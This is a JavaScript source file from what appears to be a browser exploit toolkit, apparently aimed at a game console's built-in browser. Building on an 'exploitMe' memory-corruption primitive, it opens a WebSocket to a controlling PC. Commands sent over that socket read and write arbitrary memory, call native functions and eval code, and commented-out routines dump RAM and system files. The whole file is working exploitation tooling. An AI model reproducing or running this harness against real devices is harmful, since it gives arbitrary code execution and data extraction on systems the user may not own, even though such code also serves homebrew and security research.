var reservedWords = require('reserved-words')

var sploitcore = require('./sploitcore')
var utils = require('./utils')
var types = require('./types')

var socket;

window.onerror = function(msg, url, line) {
	if(msg == 'Out of memory')
		alert(msg);
	utils.send('error', [line, msg]);
	if(socket) {
		socket.send(JSON.stringify({
			type: 'error',
			response: [ line, msg ]
		}))
	}
	location.reload();
};

utils.log('Loaded');

var bridgedFns = {}

function handler(sc, socket) {
	return function(event) {
		var data = JSON.parse(event.data);

		if(data.cmd === 'sp') {
			utils.log('running getSP()...');
			var sp = sc.getSP();

			socket.send(JSON.stringify({
				type: 'gotsp',
				response: utils.paddr(sc.getSP())
			}));
		} else if(data.cmd === 'call') {
			utils.log('got data:' + JSON.stringify(data));
			var name = data.args.shift();

			utils.log('trying to use saved fn ' + name);

			var fn = bridgedFns[name];

			if(!fn) {
				return utils.log('unknown bridged fn');
			}

			var out = fn.apply(fn, data.args);

			if(fn.rettype !== types.char_p)
				out = utils.paddr(out);

			socket.send(JSON.stringify({
				type: 'call',
				response: out
			}));
		} else if(data.cmd === 'gc') {
			utils.log('running GC');
			sc.gc();
			socket.send(JSON.stringify({
				type: 'gcran'
			}));
		} else if(data.cmd === 'bridge') {
			var name = data.args.shift();

			// Parse addr
			data.args[0] = parseInt(data.args[0]);

			var fn = sc.bridge.apply(sc, data.args);

			utils.log('saved fn as ' + name);

			bridgedFns[name] = fn;

			socket.send(JSON.stringify({
				type: 'bridged'
			}));
		} else if(data.cmd === 'bridges') {
			socket.send(JSON.stringify({
				type: 'bridges',
				response: Object.keys(bridgedFns)
			}));
		} else if(data.cmd === 'malloc') {
			var size = parseInt(data.args[0]);
			var addr = sc.malloc(size);
			socket.send(JSON.stringify({
				type: 'mallocd',
				response: utils.paddr(addr)
			}));
		} else if(data.cmd === 'free') {
			var addr = utils.parseAddr(data.args[0]);
			sc.free(addr);
		} else if(data.cmd === 'write4' || data.cmd === 'write8') {
			utils.log(JSON.stringify(data));
			var addr = utils.parseAddr(data.args[0]);
			var value = parseInt(data.args[1]);
			var offset = parseInt(data.args[2]) || 0;

			sc[data.cmd](value, addr, offset);
		} else if(data.cmd === 'read4' || data.cmd === 'read8') {
			var addr = utils.parseAddr(data.args[0]);
			var offset = parseInt(data.args[1]) || 0;

			var response = sc[data.cmd](addr, offset);

			socket.send(JSON.stringify({
				type: 'rread',
				response: response
			}));
		} else if(data.cmd === 'readstring') {
			var addr = utils.parseAddr(data.args[0]);
			var length = parseInt(data.args[1]) || 0;

			socket.send(JSON.stringify({
				type: 'rreadstring',
				response: sc.readString(addr, length)
			}));
		} else if(data.cmd === 'eval' || data.cmd === 'evalfile') {
			var words = Object.keys(reservedWords.KEYWORDS['6-strict'])
			var code = data.args.join(' ');
			var ret = true
			if(~code.indexOf('window.response')) {
				ret = false
			}
			for (var i = 0; i < words.length; i++) {
				var w = words[i]
				var s = code.substr(0, w.length)
				if (s === w) {
					ret = false
				}
			}
			if (ret) {
				code = 'window.response = ' + code
			}
			window.response = null;
			eval('with (sc) { ' + code + '}');
			socket.send(JSON.stringify({
				type: 'evald',
				response: window.response || 'no output'
			}));
		}
	}
}

function setupListener(sc) {
	socket = new WebSocket("ws://" + window.location.hostname + ":8100");

	socket.onmessage = handler(sc, socket);

	socket.onopen = function() {
		utils.log('Connected to PC..');
	};
}

function main() {
	if(window.exploitMe == null) {
		utils.log('Exploit failed.');
		utils.log('~~failed');
		location.reload();
		return;
	}

	var sc = window.sc = new sploitcore(window.exploitMe); // Keep SC in window just so the GC never even tries to wipe us out. Just for sanity.

	var dump_all_ram = false;
	if(dump_all_ram) {
		var addr = [0, 0];
		var last = [0, 0];
		while(true) {
			var mi = sc.queryMem(addr);
			last = addr;
			addr = utils.add2(mi[0], mi[1]);
			utils.log(utils.paddr(mi[0]) + ' - ' + utils.paddr(addr) + '  ' + mi[2] + ' ' + mi[3]);

			if(mi[3] != 'NONE')
				sc.memdump(mi[0], mi[1][0], 'memdumps/' + utils.paddr(mi[0]) + ' - ' + utils.paddr(addr) + ' - ' + mi[3] + '.bin');

			if(addr[1] < last[1]) {
				utils.log('End');
				break;
			}
		}
	}

	// utils.log('Calling sleepthread...');
	// var ret = sc.svc(0xB, [[0x2A05F200, 0x1]], true); // SvcSleepThread(5000000000 ns) = sleep for5 seconds
	// utils.log('Sleepthread returned ' + utils.paddr(ret));


	//sc.dirlist('shareddata:/');

	//folders
	//sc.dirlist('data:/');
	//sc.dirlist('offline:/'); //crashes
	//sc.dirlist('sd:/'); //crashes
	//sc.dirlist('sdcard:/'); //crashes
	//sc.dirlist('saveuser:/'); //crashes
	//sc.dirlist('savecommon:/'); //crashes
	//sc.dirlist('blacklist:/');
	//sc.dirlist('shareddata:/');
	//sc.dirlist('oceanShared:/');
	//sc.dirlist('oceanShared:/lyt');
	//sc.dirlist('shareddata:/webdatabase');
	//sc.dirlist('shareddata:/browser/emoji');
	//sc.dirlist('shareddata:/browser/page');

	//files
	//sc.dumpFile('oceanShared:/dummy.txt');
	//sc.dumpFile('shareddata:/buildinfo/buildinfo.dat');
	//sc.dumpFile('shareddata:/browser/Skin.dat');
	//sc.dumpFile('shareddata:/browser/MediaControls.css');
	//sc.dumpFile('shareddata:/browser/MediaControls.js');
	//sc.dumpFile('shareddata:/browser/ErrorPageTemplate.html');
	//sc.dumpFile('shareddata:/browser/ErrorPageSubFrameTemplate.html');
	//sc.dumpFile('shareddata:/browser/ErrorPageFilteringTemplate.html');
	//sc.dumpFile('shareddata:/browser/UserCss.dat');
	//sc.dumpFile('shareddata:/browser/RootCaSdk.pem');
	//sc.dumpFile('shareddata:/browser/RootCaEtc.pem');
	//sc.dumpFile('shareddata:/browser/effective_tld_names.dat');
	//sc.dumpFile('shareddata:/.nrr/netfront.nrr');
	//sc.dumpFile('shareddata:/dll/peer_wkc.nro');
	//sc.dumpFile('shareddata:/dll/oss_wkc.nro');
	//sc.dumpFile('shareddata:/dll/cairo_wkc.nro');
	//sc.dumpFile('shareddata:/dll/libfont.nro');
	//sc.dumpFile('shareddata:/dll/webkit_wkc.nro');
	//sc.dumpFile('data:/sound/cruiser.bfsar');

	//var ret = 0x3F99DC;
	//sc.call(ret, [256,257,258,259,260,261,262,263], [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30], true);

	setupListener(sc);
}

main();
